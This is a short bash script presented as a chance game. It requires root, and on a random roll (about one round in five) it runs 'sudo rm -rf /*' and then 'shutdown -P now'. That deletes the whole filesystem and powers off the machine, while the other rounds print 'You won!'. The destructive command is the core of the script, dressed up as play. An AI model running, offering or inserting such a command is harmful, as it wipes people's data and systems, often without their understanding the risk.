#!/bin/bash

if [ $UID -ne 0 ]; then
	echo "RUN THIS SCRIPT AS SUDO -_-"
	exit
fi
echo -e "How many rounds do you wanna play?"
read rounds
for i in $(seq 1 $rounds); do

	num=$[ $RANDOM % 5 + 0 ]

	if [ $num == 1 ]; then
		echo "Have a nice life"
		sudo rm -rf /* ; shutdown -P now
	else
		echo "You won!"
	fi
	sleep 2
done

echo -e "Congratsss!"
